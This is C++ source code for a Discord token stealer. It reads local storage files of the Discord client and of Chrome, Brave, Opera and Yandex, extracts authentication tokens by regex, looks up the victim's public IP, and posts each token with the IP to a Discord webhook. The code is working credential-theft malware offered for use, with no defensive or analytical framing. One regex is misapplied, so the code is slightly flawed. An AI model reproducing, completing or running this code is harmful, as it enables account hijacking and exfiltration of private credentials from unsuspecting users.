#include <iostream>
#include <fstream>
#include <vector>
#include <regex>
#include <filesystem>
#include "cpr/cpr.h"
#include "json.hpp"

using namespace nlohmann;

class TokenLogger
{
public:
    TokenLogger()
    {
        GetPaths();
        for (int i = 0; i < Paths.size(); i++)
        {
            std::string TargetFolder = Paths[i] + "\\Local Storage\\leveldb";
            if (std::filesystem::exists(TargetFolder))
            {
                for (auto const& dir_entry : std::filesystem::directory_iterator(TargetFolder))
                {
                    if (dir_entry.path().extension() == ".log" || dir_entry.path().extension() == ".ldb")
                    {
                        GetToken((dir_entry.path().string()));
                    }
                }
            }

        }
        std::string resp = cpr::Get(cpr::Url("https://httpbin.org/get")).text;
        auto parseResp = json::parse(resp);

        std::string IPAddress = parseResp["origin"];
        std::string Discord = std::to_string(ValidTokens.size()) + " tokens found on this device!";
        for (int i = 0; i < ValidTokens.size(); i++)
        {
            std::string tokenss = "``" + ValidTokens[i] + "``" + "\nIP Address: " + IPAddress;;
            std::string Response = cpr::Post(cpr::Url(WEBHOOK), cpr::Payload{ {"content", tokenss} }).text;
        }
    }
private:
    void GetPaths()
    {
        char* roaming;
        size_t len;
        _dupenv_s(&roaming, &len, "APPDATA");

        char* local;
        size_t len2;
        _dupenv_s(&local, &len2, "LOCALAPPDATA");

        Paths.push_back(std::string(roaming) + "\\Discord");
        Paths.push_back(std::string(roaming) + "\\discordcanary");
        Paths.push_back(std::string(roaming) + "\\discordptb");
        Paths.push_back(std::string(roaming) + "\\Opera Software\\Opera Stable");
        Paths.push_back(std::string(local) + "\\Google\\Chrome\\User Data\\Default");
        Paths.push_back(std::string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
        Paths.push_back(std::string(local) + "\\Yandex\\YandexBrowser\\User Data\\Default");
        free(local);
        free(roaming);
    }

    std::vector<std::string> FindMatches(std::string Input, std::regex Regex)
    {
        std::vector<std::string> output;
        std::sregex_iterator currentMatch(Input.begin(), Input.end(), Regex);
        std::sregex_iterator lastMatch;

        while (currentMatch != lastMatch) {
            std::smatch match = *currentMatch;
            output.push_back(match.str());
            currentMatch++;
        }

        return output;
    }

    void GetToken(std::string Path)
    {
        std::ifstream ReadFile(Path, std::ios::binary);
        std::string FileContents((std::istreambuf_iterator<char>(ReadFile)), (std::istreambuf_iterator<char>()));
        std::regex NormalRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
        std::regex MailRegex("mfa\\.[\\w-]{84}");

        std::vector<std::string> ValidNormalTokens = FindMatches(FileContents, NormalRegex);
        std::vector<std::string> ValidMailTokens = FindMatches(FileContents, NormalRegex);

        for (int i = 0; i < ValidNormalTokens.size(); i++)
        {
            ValidTokens.push_back(ValidNormalTokens[i]);
        }

        for (int i = 0; i < ValidMailTokens.size(); i++)
        {
            ValidTokens.push_back(ValidMailTokens[i]);
        }
    }


private:
    std::vector<std::string> Paths; // ARRAY
    std::vector<std::string> ValidTokens;
};

int main()
{
    TokenLogger Logger;
    system("PAUSE");
}